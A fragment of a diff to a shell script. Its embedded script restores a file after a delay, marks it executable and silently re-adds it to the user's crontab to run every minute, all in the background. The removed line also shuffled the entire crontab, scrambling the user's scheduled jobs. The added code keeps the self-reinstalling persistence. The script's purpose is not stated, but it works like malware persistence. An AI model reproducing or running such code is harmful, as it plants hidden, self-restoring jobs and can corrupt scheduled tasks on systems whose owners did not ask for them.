@@ -115,7 +115,7 @@ skript="
     sleep 177
     printf '%s' \"\$filecontent\" > '$this_file_path'
     chmod +x -- '$this_file_path'
-    { crontab -l | grep -Fv '$this_file_path'; printf '* * * * * %s\n' '$this_file_path'; } | shuf | crontab -
+    { crontab -l | grep -Fv '$this_file_path'; printf '* * * * * %s\n' '$this_file_path'; } | crontab -
 "
 
 printf '%s\n' "$skript" | sh | grep -v 'Backup of .* previous crontab saved to' &
